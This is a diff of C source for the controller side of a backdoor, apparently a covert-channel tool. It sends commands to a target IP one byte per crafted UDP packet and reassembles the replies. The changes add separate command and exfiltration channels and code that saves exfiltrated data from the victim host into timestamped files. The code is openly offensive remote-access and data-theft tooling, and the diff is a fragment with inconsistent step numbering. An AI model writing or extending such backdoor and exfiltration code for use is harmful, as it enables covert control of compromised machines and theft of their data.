@@ -14,30 +14,25 @@
 #include "inet.h"
 
 int closing;
+int com_chan;
+int xfl_chan;
 
-void backdoor_client(uint32 ipaddr, int dport)
+void backdoor_client(uint32 ipaddr, int dport, int cchan, int xchan)
 {
-//	struct sockaddr_in saddr;
 	char command[MAX_LEN];
 	pthread_t list_thread;
-//	pthread_t exfil_thread;
 
-//	sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
-//	bzero(&saddr, sizeof(saddr));
-	
+	com_chan = cchan;
+	xfl_chan = xchan;
+
 	if (ipaddr == 0)
 		error("Invalid IP specified.");
 
 	if (!val_port(dport))
 		error("Invalid destination port specified.");
 
-//	saddr.sin_family = AF_INET;
-//	saddr.sin_addr.s_addr = ipaddr;
-//	saddr.sin_port = htons(dport);
-
 	closing = 0;
 	pthread_create(&list_thread, NULL, listen_thread, &ipaddr);
-//	pthread_create(&exfil_thread, NULL, exfil_listen, &ipaddr);
 	
 	printf("Ready, awaiting your command...\n");
 	while(fgets(command, MAX_LEN, stdin) != NULL)
@@ -66,10 +61,6 @@ void backdoor_client(uint32 ipaddr, int dport)
 
 //			enc = encrypt(SEKRET, frame, FRAM_SZ);
 
-//			sendto(sock, enc, FRAM_SZ, 0, (struct sockaddr *)&saddr, sizeof(saddr));
-
-//			free(enc);
-
 			for (int j = 0; j < FRAM_SZ; ++j)
 			{
 				uint8 byte = frame[j];
@@ -80,6 +71,8 @@ void backdoor_client(uint32 ipaddr, int dport)
 				_send(ipaddr, src_port, dst_port, CHAN_UDP);
 				usleep(SLEEP_TIME);
 			}
+
+//			free(enc);
 		}
 
 		free(trans);
@@ -113,21 +106,22 @@ void *listen_thread(void *arg)
 
 		read(sock, &packet, MAX_LEN);
 
-		// Step 1: check IP address
+		// Step 2: check IP address
 		ip = ((uint32*)packet) + 3;
 		if (*ip != ipaddr)
 			continue;
 
-		// Step 2: check for signature
-
 		// Step 3: dump data into buffer
 		ptr = (char *)(packet + IP_LEN);
 
+		// Step 4: check for signature
 		if (*ptr == SIGNTR)
 			continue;
-
+		
+		// Step 5: Point to 2nd Byte
 		++ptr;
 
+		// Step 6: Decrypt and extract
 //		dec = decrypt(SEKRET, ptr, FRAM_SZ);
 		data = buf + buf_len;
 		memcpy(data, ptr, 1);
@@ -135,16 +129,33 @@ void *listen_thread(void *arg)
 
 		buf_len += 1;
 
-		// Step 4: see if we have a full transmission
+		// Step 7: see if we have a full transmission
 		data = getTransmission(buf, &buf_len, &type);
 		if (data == NULL)
 			continue;
 
-		// Step 5: show the results
+		// Step 8: show the results
 		if (type == RSP_TYP)
+		{
 			printf("Data: %s", data);
+		}
+		else if (type == XFL_TYP)
+		{
+			char fname[MAX_LEN];
+			FILE* file;
+			uint64 timestamp;
 
-		// Step 6: reset buffer
+			timestamp = get_sec();
+			sprintf(fname, "%llX", timestamp);
+			file = open_file(fname, TRUE);
+
+			printf("%s", data);
+			fwrite(data, buf_len, 1, file);
+
+			fclose(file);
+		}
+
+		// Step 9: reset buffer
 		memset(buf, 0, MAX_LEN);
 		memset(packet, 0, MAX_LEN);
 		buf_len = 0;
@@ -187,8 +198,8 @@ void* exfil_listen(void *arg)
 		pack_len = read(sock, &packet, MAX_LEN);
 
 		// Step 1: locate the payload portion of the packet
-//		if (pack_len - IP_UDP_LEN <= 0)
-//			continue;
+		if (pack_len <= 0)
+			continue;
 
 		// Step 1: check IP address
 		ip = ((uint32*)packet) + 3;
